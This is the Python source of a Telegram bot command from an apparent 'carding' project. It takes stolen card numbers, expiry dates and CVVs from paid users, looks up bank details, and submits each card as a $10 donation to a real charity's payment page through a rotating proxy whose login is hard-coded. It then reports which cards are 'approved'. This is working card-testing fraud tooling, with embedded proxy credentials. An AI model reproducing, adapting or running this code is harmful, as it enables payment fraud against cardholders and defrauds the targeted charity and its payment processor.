import requests
import time
import random
import json
import string
import re
import urllib
from datetime import datetime
from random import choice

from pyrogram import Client
from pyrogram.types import Message

from carding.functions import *
from carding.database.checkuser_sql import already_added

"""
?l = lowercase
?u = uppercase
?d = digit
?f = uppercase + lowercase
?m = uppercase + digit
?n = lowercase + digit
?i = uppercase + lowercase + digit
"""


def genRandomStr(toReplace):
    lc = string.ascii_lowercase
    uc = string.ascii_uppercase
    dg = string.digits
    lu = string.ascii_lowercase + string.ascii_uppercase
    ud = string.ascii_uppercase + string.digits
    ld = string.ascii_lowercase + string.digits
    uld = string.ascii_uppercase + string.ascii_lowercase + string.digits
    for x in toReplace:
        toReplace = toReplace.replace("?l", random.choice(lc), 1)
        toReplace = toReplace.replace("?u", random.choice(uc), 1)
        toReplace = toReplace.replace("?d", random.choice(dg), 1)
        toReplace = toReplace.replace("?f", random.choice(lu), 1)
        toReplace = toReplace.replace("?m", random.choice(ud), 1)
        toReplace = toReplace.replace("?n", random.choice(ld), 1)
        toReplace = toReplace.replace("?i", random.choice(uld), 1)
    return toReplace

proxiesv = {
  "http": "http://czihsxrc-rotate:16k5tz6aylpx@p.webshare.io:80/",
  "https": "http://czihsxrc-rotate:16k5tz6aylpx@p.webshare.io:80/"
}

@Client.on_message(cmd('au2'))
async def au2_func(client, message: Message):
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    # if user_id != 5032070399:
      # return await message.reply("**GATE MAINTENANCE!**")
  
    file = open('carding/temp/Premium.txt', 'r').readlines()
    if str(message.chat.id) + "\n" in file or str(user_id) + "\n" in file or user_id == 5032070399:
       pass
    else:
       await message.reply_text("**SORRY!**\nThis cmd only for paid users..")
       return
    if is_spam(user_id):
        return await message.reply_text("**ANTISPAM!**\nWait in 5s and try again..")
    try:
        if already_added(user_id):
            pass
        elif not already_added(user_id):
            await message.reply_text("Please **register** 1st..\nSend /register for registration")
            return
        query = ''
        for i in message.command[1:]:
            query += ' ' + str(i)
        if not query:
            await message.reply_text("**Input valid Card!**\nEx: `/au cc|mm|yy|cvv`")
            return
        
        start_time = time.time()
        text = "**Checking Your Card...⏳**"
        msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
        splitter = re.findall(r"[0-9]+", query)
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvc = splitter[3]
        cc1 = cc[:4]
        cc2 = cc[4:-8]
        cc3 = cc[8:-4]
        cc4 = cc[-4:]
        strlenx = len(cc)
        cvvd = cvc[:3]
        cvvx = cvc[:4]
        bin = cc[:6]
       
        file = open('carding/temp/bin.txt', 'r').readlines() 
        if str(bin) + "\n" in file:
           await msg.edit_text("**BIN BANNED!**"
                                )
           return
        mes1 = mes
        ano1 = ano
        if len(ano) == 2:
            ano = f'20{ano}'
        if cc.startswith('5'):
            typex = 'MC'
        if cc.startswith('4'):
            typex = 'Visa'
        if cc.startswith('6'):
            typex = 'Discover'
        if cc.startswith('3'):
            typex = 'AMEX'
        if (strlenx < 16):
            cvv = cvvx
        else:
            cvv = cvvd

        lista = cc + "|" + mes + "|" + ano + "|" + cvv

        
        s = requests.Session()
               

        res = requests.get("https://dragon-bin-api.vercel.app/api/" + bin)
        bin_data = json.loads(res.text)
        vendor = bin_data["data"]["vendor"]
        bank = bin_data["data"]["bank"]
        type = bin_data["data"]["type"]
        country = bin_data["data"]["country"]
        level = bin_data["data"]["level"]
        flag = bin_data["data"]["countryInfo"]["emoji"]
        # -----------[ If Not Respond ]----------------
        vendor = "Unavailable" if not vendor else vendor
        bank = "Unavailable" if not bank else bank
        type = "Unavailable" if not type else type
        level = "Unavailable" if not level else level

        url = 'https://new.civiconline.org/civic2/Donate/DonateSanctuaryNight.jsp'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
        data = 'Gifts.Amount0=10&recurrance=once&GiftTributeType=&GiftTributeText=&Contacts.FirstName=at&Contacts.LastName=mos&ContactAddresses.Address1=192+street&ContactAddresses.Address2=&ContactAddresses.City=NY&ContactAddresses.StateString=NY&ContactAddresses.Zip=10980&Contacts.Email=atmos%40gmail.com&Contacts.Phone1=05194692514&Members.BusinessName=&Gifts.Comment=&CCName=at&CreditCard.Method='+type+'&CCNum='+cc+'&CCCVV='+cvv+'&CreditCard.ExpMonth='+mes+'&CreditCard.ExpYear='+ano+'&CRACTION=Process+Donation'
        time.sleep(3)
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxiesv)
        result = getStr(resp.text, 'been approved because:<br>', '<')

        # print(resp.text)
        stop_time = time.time() - start_time
        date = datetime.today().strftime('%d-%m-%Y')
        if 'This transaction has been declined' in resp.text:
           status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ⭕"
           reson = 'This transaction has been declined.'
        elif 'The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder. ' in resp.text:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = 'AVS MISMATCH'
        else:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "Charged 10$"

        lastxrespon = f"""
𝐆𝐀𝐓𝐄 𝐀𝐔𝐓𝐇𝐍𝐄𝐓 𝐕2 𝐂𝐇𝐀𝐑𝐆𝐄 10$
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
•𝗦𝘁𝗮𝘁𝘀: {status}
•𝗠𝘀𝗴: {reson}
•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲: {bank}
•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱: {vendor}
•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: {type} • {level}
•𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
•𝗧𝗼𝗼𝗸: <code>{stop_time:.02f}s</code> [ {date} ]
•━━━━━━━━━━━━━━━━━━━•
•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={user_id}">{name}</a> [ {ustat(user_id)} ]
"""

        await msg.edit_text(lastxrespon, parse_mode="HTML")
        curl.close()

    except Exception as e:      
        print(e)
